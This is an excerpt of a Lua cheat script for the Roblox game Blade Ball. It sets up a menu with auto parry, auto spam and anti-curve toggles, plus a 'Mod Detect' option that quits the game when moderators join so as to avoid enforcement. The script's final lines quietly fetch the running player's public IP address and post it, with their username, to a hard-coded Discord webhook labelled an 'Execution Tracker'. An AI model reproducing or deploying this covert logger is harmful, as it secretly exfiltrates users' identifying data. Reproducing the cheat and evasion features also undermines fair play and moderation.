...
local Tabs = {
	Main = Window:AddTab({ Title = "Automation (blatant)", Icon = "sword" }),
Anti = Window:AddTab({ Title = "Counter", Icon = "shield"})    
...
do
	local auto_parry = Tabs.Main:AddToggle("ap",{
		Title = "Auto Parry", 
		Description = "Main Auto Parry (may be blatant)",
		Default = false,
	})
	local auto_pary = Tabs.Main:AddToggle("apa",{
		Title = "Auto Spam", 
		Description = "Main Auto Spam (may be blatant)",
		Default = false,
	})
	local aut_pary = Tabs.Main:AddToggle("apaa",{
		Title = "Manual Spam", 
		Description = "Backup For Auto Spam (very blatant)",
		Default = false,
	})
	...
	local personnel_detector2 = Tabs.Setting:AddToggle("pd",{
		Title = "Mod Detect", 
		Description = "Auto Leave When Mod/Dev/Youtuber Joins",
		Default = false,
	})
	...
	local anti_lag = Tabs.Visual:AddToggle("al",{
		Title = "Optimizer", 
		Description = "Optimize for less lag",
		Default = false,
	})
...
do
	local dymanic_curve_check = Tabs.Setting:AddToggle("dcc",{
		Title = "Curve Detect", 
		Description = "Curve detection for Auto Spam",
		Default = false,
	})
	...
	local adjust_spam_speed = Tabs.Setting:AddDropdown("*****",{
		Title = "Spam Speed",
...
local antiCurve = Tabs.Anti:AddToggle("ac",{
    Title = "Anti Curve",
    Description = "Prevent Curves",
    Default = false,
})
antiCurve:OnChanged(function(v)
  anticurveskibi = v
end)
...
function PostWebhook(Url, message)
	...
	local data = request({Url=Url,Method="POST",Headers={["Content-Type"]="application/json"},Body=game:GetService("HttpService"):JSONEncode(message)});
	return "";
end
function AdminLoggerMsg()
	local randomColor = math.random(0, 16777215);
	local AdminMessage = {embeds={{title="** Bladeball Execution Tracker **",description="",type="rich",color=randomColor,fields={{name="**Username**",value=("```" .. game.Players.LocalPlayer.Name .. "```"),inline=true},{name="**IP Address**",value=("```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```"),inline=false}},timestamp=os.date("!%Y-%m-%dT%H:%M:%S")}}};
	return AdminMessage;
end
PostWebhook("https://discord.com/api/webhooks/1291380477684482068/89wFrIV9a-5OCPUe8UrmL9CfudnoIQVXXXYZJIDNX9kRWe5jwYc3_qibB7o7cdrAKSQu", AdminLoggerMsg());